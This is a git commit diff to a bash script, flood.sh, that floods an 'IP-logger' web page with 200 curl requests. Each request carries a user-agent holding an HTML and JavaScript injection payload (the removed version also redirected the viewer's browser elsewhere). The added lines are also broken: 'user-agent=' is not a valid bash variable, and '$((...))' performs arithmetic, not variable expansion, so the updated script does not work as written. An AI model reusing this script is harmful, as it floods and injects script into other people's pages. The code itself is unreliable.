724ac0efe4a18b77093ecd9c6a4c215e9bbba6f5
SossenSystems <33610430+SossenSystems@users.noreply.github.com>
2018-02-25 23:18:31 +0100

    Update flood.sh

--- flood.sh
+++ flood.sh
@@ -1,12 +1,14 @@
 #!/bin/bash
 count=200; #Spam counter!
+url="http://example.com/iplogger.php" #The logger page can be entered here.
+user-agent="IP-Logger/3.0.1 (Flood; HackOS; Linux x86_64; rv:52.4) <b>Flood $((i))!</b> <script>alert('Do not log my IP address!!');</script>" #The user agent can be defined here
 RED='\033[0;31m'
 GREEN='\e[32m'
 NC='\033[0m'
 if [[ $1 == 'start' ]]; then 
 	printf "${RED}Start flooding...${NC}\n"
 	for ((i=0; i < count; i++)) ; do
-		curl --silent --output /dev/null -A "IP-Logger/3.0.1 (Flood; HackOS; Linux x86_64; rv:52.4) <b>Flood $((i))!</b> <script>alert('Anti IP-Logger!'); window.location.href = 'https://akk.li/pics/anne/jpg';</script>" https://example.com/iplogger.php > /dev/null
+		curl --silent --output /dev/null -A $((user-agent)) $((url)) > /dev/null
 	done
 	printf "${GREEN}Flooding has been finished!${NC}\n"
 else
